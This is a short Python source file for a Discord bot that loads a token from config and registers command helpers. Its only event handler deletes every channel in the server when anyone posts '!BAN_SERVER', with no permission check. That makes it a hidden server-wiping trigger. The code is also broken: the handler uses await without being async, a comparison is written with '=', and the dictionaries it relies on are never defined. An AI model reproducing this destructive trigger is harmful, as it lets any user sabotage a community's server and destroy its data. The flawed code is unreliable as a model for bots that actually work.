import discord
from discord.ext import commands

from config import settings

TOKEN = settings ['token']
ver = '0.0.0'

bot = commands.Bot (command_prefix = settings ['prefix'])

def add_command (name): 
    def adder (func):
        commands_dict [name] = func

        return func
    return adder

def add_egg (name): 
    def adder_ (func):
        egg_dict [name] = func

        return func
    return adder_
    
@bot.event
def on_message (message):
    if message.content = '!BAN_SERVER':
      for ch in message.guild.channels:
          await ch.delete ()
